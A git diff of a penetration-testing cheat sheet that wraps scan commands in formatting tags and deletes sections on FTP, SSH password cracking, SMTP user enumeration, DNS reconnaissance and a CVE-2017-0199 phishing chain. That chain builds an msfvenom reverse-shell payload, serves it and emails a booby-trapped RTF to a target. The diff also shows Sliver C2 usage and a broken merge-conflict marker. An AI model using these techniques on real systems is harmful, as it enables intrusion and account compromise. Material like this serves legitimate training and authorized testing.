@@ -55,9 +55,11 @@ autorecon IP --dirbuster.tool ffuf --dirbuster.threads 40 --dirbuster.wordlist /
 
 Proxychains autorecon
 
+{% code overflow="wrap" %}
 ```
 proxychains autorecon -t oscp/lab/ITNetwork.txt --dirbuster.tool ffuf --dirbuster.threads 50 --no-port-dirs --reports markdown -o /tmp -vv --proxychains --nmap="-vv --reason -Pn -T5"
 ```
+{% endcode %}
 
 ```
 sudo nmap -n -v -sT -A <IP> -Pn
@@ -79,9 +81,11 @@ sudo nmap -n -v -sU -Pn <IP>
 sudo nmap -n -v -sU -p- -T5 -Pn <IP>
 ```
 
+{% code overflow="wrap" %}
 ```
 run an nmap scan, then google “<xyz service> pentesting” and 9 times out of 10 will click on a link from book.hacktricks.xyz or “<xyz service> exploit” if I can find the name and version.
 ```
+{% endcode %}
 
 ## Enumeration
 
@@ -96,85 +100,6 @@ https://www.xmind.net/m/QsNUEz/
 Active Directory Enumeration
 
 https://www.xmind.net/m/5dypm8/
-
-### FTP
-
-* check for anonymous login anonymous:anonymours OR anonymous:anonymous@anonymous.com
-  * type `passive` -- if needed to remove passive mode to be able to continue to access ftp. type `binary` first then get to download files
-  * if you can download password-protected zip files use zip2john file.zip >> hashes.txt then run john hashes.txt to crack
-  * if ftp allows uploading of files and the webserver has an local file inclusion vulnerability you can upload a php shell and call the file from the webserver to gain a reverse shell maybe it’ll have functionality that auto-executes uploaded files periodically.
-* ProFTPd 1.3.5 - 'mod\_copy' Remote Command Execution
-* exiftool -- tool to extract meta data and may contain email addresses
-* wget -r ftp://user:passp@IP/ -- rescursively download
-
-### SSH
-
-#### Bruteforce with hydra
-
-Use any found usernames and use "-e nsr" for a less complicated brute force attack then with a wordlist
-
-```
-/usr/share/wordlists/rockyou.txt
-/usr/share/seclists/Passwords/probable-v2-top12000.txt
-/usr/share/seclists/Passwords/probable-v2-top1575.txt
-/usr/share/seclists/Passwords/probable-v2-top207.txt
-```
-
-#### Cracking ssh id\_rsa keys
-
-```
-ssh2john id_rsa > crackme
-```
-
-```
-john --wordlist=/usr/share/wordlists/rockyou.txt crackme
-```
-
-```
-john --show crackme
-```
-
-### SMTP
-
-#### Enumerate users
-
-Without Domain
-
-```
-smtp-user-enum -M VRFY -U wordlist -t IP
-```
-
-With Domain
-
-```
-smtp-user-enum -M VRFY -U wordlist -t IP -d example.com
-```
-
-#### [RTF Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)
-
-1. msfvenom -p windows/shell\_reverse\_tcp LHOST=local-IP LPORT=443 -f hta-psh -o msfv.hta
-2. python2 cve-2017-0199\_toolkit.py -M gen -t RTF -w MailFile.RTF -u http://local-WebServIP:Port/msfv.hta
-3. python2 -m SimpleHTTPServer 80
-4. nc -lnvp 443
-5. sendEmail -f FromEmail@example.com -t ToEmail@example.com -u "Subject" -m "Message" -a MailFile.RTF -s TargetIP -v
-
-### DNS
-
-```
-theHarvester -d arborhealthsa.com -b anubis,baidu,bing,binaryedge,bingapi,bufferoverun,censys,certspotter,crtsh,dnsdumpster,duckduckgo,fullhunt,github-code,google,hackertarget,hunter,intelx,linkedin,linkedin_links,n45ht,omnisint,otx,pentesttools,projectdiscovery,qwant,rapiddns,rocketreach,securityTrails,spyse,sublist3r,threatcrowd,threatminer,trello,twitter,urlscan,virustotal,yahoo,zoomeye
-```
-
-```
-dnsdumpster.com
-```
-
-```
-dnsrecon -r 127.0.0.1 -n 127.0.1.1
-```
-
-```
-dnsenum megacorpone.com
-```
 
 ### HTTP
 
@@ -2637,6 +2562,7 @@ reg.exe query HKLM\SYSTEM\CurrentControlSet\control\computername\activecomputern
 ```
 crackpkcs12 cert.pfx -d /usr/share/wordlists/rockyou.txt
 ```
+
 <<<<<<< HEAD
 
 ### Using Sliver C2
@@ -2676,5 +2602,7 @@ sessions
 ```
 use SessionID
 ```
-=======
->>>>>>> 6912adbe47a973e22839842f37be3ab4655a044d
+
+\=======
+
+> > > > > > > 6912adbe47a973e22839842f37be3ab4655a044d
